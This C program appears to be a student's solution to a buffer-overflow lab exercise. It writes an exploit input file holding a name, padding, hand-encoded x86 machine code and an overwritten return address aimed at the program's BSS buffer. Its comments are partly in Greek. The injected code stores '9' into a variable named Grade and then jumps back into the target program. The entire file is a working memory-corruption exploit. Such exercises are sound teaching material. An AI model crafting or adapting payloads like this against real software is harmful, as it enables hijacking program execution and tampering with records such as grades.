#include <stdio.h>
#include <errno.h>
#include <stdlib.h> 
#include <string.h>

int main(void){
	FILE *fp;
    int i;
    
	fp = fopen("data9.txt","w+");
   
   if(fp == NULL){
   		fprintf(stderr , "Error Opening The File .\n");
		exit(1);	
    	}
    
    fputc('G',fp);
    fputc('r',fp);
    fputc('e',fp);
    fputc('g',fp);
    fputc('\0',fp);
            
    fputc(' ',fp);
    fputc(' ',fp);
    fputc(' ',fp);

  /*mov $0x39 , 0x80d46e8*/

/*address : 0x ffff cf 70 */
  
   
    
    fputc(0xc6,fp);    /* OpCode of movb */
    fputc(0x05,fp); 
    fputc(0xe8,fp);    /* Address of Grade */
    fputc(0x46,fp);
    fputc(0x0d,fp);
    fputc(0x08,fp);
    fputc(0x39,fp);     /* '9' */   

 /*jmp 0x8048b6f */    
    

    fputc(0xe9,fp);   /*OpCode of jmp*/
    fputc(0x7b,fp);   /* */
    fputc(0x25,fp);
    fputc(0xf7,fp);
    fputc(0xff,fp);

    
    for(i = 1 ; i <= 28 ; i++)
        fputc(' ',fp);

    fputc('8',fp);   /*Otan i = 48 => Write i = 56 */

    fputc(0xe8,fp);    /* return to BSS segment : se kapoia the thesi tou array Name[BuffSize] */
    fputc(0x65,fp);
    fputc(0x0d,fp);
    fputc(0x08,fp);
 
 /*Epeidi exei to buf[i] = 0 prepei na grapsw ksana to argument s*/ 

    fputc(0xe0,fp);
    fputc(0x65,fp);
    fputc(0x0d,fp);
    fputc(0x8,fp);

    fclose(fp);
	return 0;
}
	


